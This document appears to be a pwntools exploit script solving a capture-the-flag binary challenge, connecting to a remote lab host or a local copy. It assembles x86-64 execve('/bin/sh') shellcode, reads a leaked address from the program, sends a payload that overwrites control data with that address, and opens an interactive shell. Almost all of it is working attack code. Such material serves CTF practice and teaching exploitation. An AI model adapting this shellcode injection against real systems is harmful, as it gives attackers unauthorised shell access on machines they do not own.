from pwn import *


# ===========================================================
#                       CONFIG SETUP
# ===========================================================
def initIO(argv=[]):
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(argv or [elf.path], gdbscript=script)
        return elf.process()

    host = conn.split(" ")[0]
    port = int(conn.split(" ")[1])

    return remote(host, port)


if args.DEBUG:
    context.log_level = "debug"

context.terminal = "wt.exe -w 0 sp -p kali-linux -- wsl --cd".split() + [os.getcwd()]

elf = "./main_patched"
if elf != "":
    elf = context.binary = ELF(elf)

libc = ""
if libc != "":
    libc = ELF(libc, checksec=False)
if args.LOCAL:
    libc = elf.libc

script = """
    b main
    c
"""

conn = "sisterlab.id 42071"
io = initIO()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

sc = asm(
    """
    lea rdi, [rip+binsh]
    xor esi, esi
    xor edx, edx
    mov al, 0x3b
    syscall
binsh:
    .asciz "/bin/sh"
"""
)

io.recvuntil(b"0x")
addr = int(io.recvline(), 16)
io.sendlineafter(b"> ", b"n")
io.sendlineafter(b"> ", flat({0: sc, 0x17: addr}))


# ===========================================================
#                       INTERACTIVE
# ===========================================================

io.interactive()
